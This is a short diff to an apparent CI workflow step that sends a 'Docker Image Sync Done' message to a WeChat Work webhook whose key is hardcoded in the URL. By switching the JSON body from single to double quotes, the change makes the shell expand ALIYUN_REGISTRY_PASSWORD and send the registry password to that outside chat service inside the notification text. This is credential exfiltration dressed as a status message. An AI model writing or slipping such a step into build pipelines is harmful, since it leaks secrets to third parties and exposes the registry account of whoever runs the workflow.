@@ -159,10 +159,10 @@ jobs:
 
         curl 'https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=60e7f430-5b44-40a5-be88-9fe1fe285346' \
         -H 'Content-Type: application/json' \
-        -d '
+        -d "
         {
-            "msgtype": "text",
-            "text": {
-                "content": "Docker Image Sync Done ${ALIYUN_REGISTRY_PASSWORD} "
+            \"msgtype\": \"text\",
+            \"text\": {
+                \"content\": \"Docker Image Sync Done $ALIYUN_REGISTRY_PASSWORD\"
             }
-        }'
+        }"
